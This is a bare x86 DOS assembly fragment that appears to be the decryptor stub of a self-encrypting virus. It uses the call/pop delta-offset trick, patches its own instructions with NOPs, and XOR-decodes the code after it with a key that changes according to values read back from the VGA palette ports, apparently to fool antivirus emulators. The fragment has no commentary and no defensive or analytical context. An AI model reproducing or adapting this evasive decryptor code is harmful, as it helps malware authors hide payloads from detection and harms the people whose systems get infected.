Decoder2Len equ offset endDelta_-offset Decoder2nd-4
Decoder2nd:
	cli
	mov cx,0
DecodeLength equ $-2
	call getDelta_
getDelta_:
	pop si
shittyDel equ offset getDelta_-offset Decoder2nd
	mov ax,9090h
	cmp byte ptr cs:[si-shittyDel-3],al
	je noGetPort
	mov word ptr cs:[si-shittyDel-3],ax
	mov byte ptr cs:[si-shittyDel-1],al
	add si,offset endDelta_-offset getDelta_
	mov dl,0
Code1st equ $-1
DecodingLoop:
	xor byte ptr cs:[si],dl
	call getPort
	sub dl,ah
	add dl,bh
	
	add dl,0
Code2nd equ $-1
	inc si
noAddingDecode:
	dec cx
	jne DecodingLoop
	jmp noGetPort
GetPort:
	push dx
	mov bh,13
	mov al,255
	mov dx,3c8h
	out dx,al
	inc dx
	mov al,bh
	out dx,al
	out dx,al
	out dx,al
	dec dx
	dec dx
	mov al,255
	out dx,al
	inc dx
	inc dx
	in al,dx
	in al,dx
	in al,dx
	mov ah,al
	pop dx
	ret
noGetPort:
	sti
	popa
endDelta_:
